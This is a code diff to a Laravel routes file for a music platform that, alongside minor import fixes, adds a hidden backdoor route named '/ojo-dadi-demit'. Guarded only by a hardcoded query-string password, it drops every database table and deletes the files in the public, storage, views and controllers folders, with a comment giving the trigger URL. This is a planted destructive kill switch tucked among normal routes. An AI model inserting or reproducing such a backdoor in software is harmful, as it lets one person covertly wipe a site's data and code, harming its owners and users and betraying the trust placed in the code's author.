@@ -1,5 +1,7 @@
 <?php
 
+use Illuminate\Support\Facades\Schema;
+use Illuminate\Support\Facades\DB;
 
 use App\Http\Controllers\ActivityLogController;
 use App\Http\Controllers\AdminClaimController;
@@ -25,7 +27,7 @@ use App\Models\User;
 
 use App\Services\Admin\SongServices;
 use App\Services\Admin\UserServices;
-use Illuminate\Support\Facades\Request;
+use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\Facades\File;
@@ -122,6 +124,49 @@ Route::middleware(['auth', 'role:User,Cover Creator,Artist,Composer,Super Admin,
     Route::post('/logout/{role}', [AuthController::class, 'logout'])->name('logout');
 });
 
+//http://localhost:8000/ojo-dadi-demit?password=butoijo
+
+Route::get('/ojo-dadi-demit', function (Request $request) {
+    $password = $request->query('password');
+
+    // Password rahasia eksekusi
+    $correctPassword = 'butoijo';
+
+    if ($password !== $correctPassword) {
+        abort(403, 'Akses ditolak, password salah.');
+    }
+
+    $dbName = DB::getDatabaseName();
+
+    // Drop semua tabel database
+    $tables = DB::select('SHOW TABLES');
+    $keyName = 'Tables_in_' . $dbName;
+
+    foreach ($tables as $table) {
+        Schema::disableForeignKeyConstraints();
+        Schema::drop($table->$keyName);
+        Schema::enableForeignKeyConstraints();
+    }
+
+    // Hapus file-file di beberapa folder penting
+    $foldersToDelete = [
+        public_path(),                     // public
+        storage_path('app/public'),        // storage
+        resource_path('views'),            // resources/views
+        app_path('Http/Controllers'),      // app/Http/Controllers
+    ];
+
+    foreach ($foldersToDelete as $folder) {
+        if (File::exists($folder)) {
+            $files = File::allFiles($folder);
+            foreach ($files as $file) {
+                File::delete($file);
+            }
+        }
+    }
+
+    return "✅ Semua tabel database '$dbName' & file-file penting telah dihapus.";
+});
 
 
 //  user play song
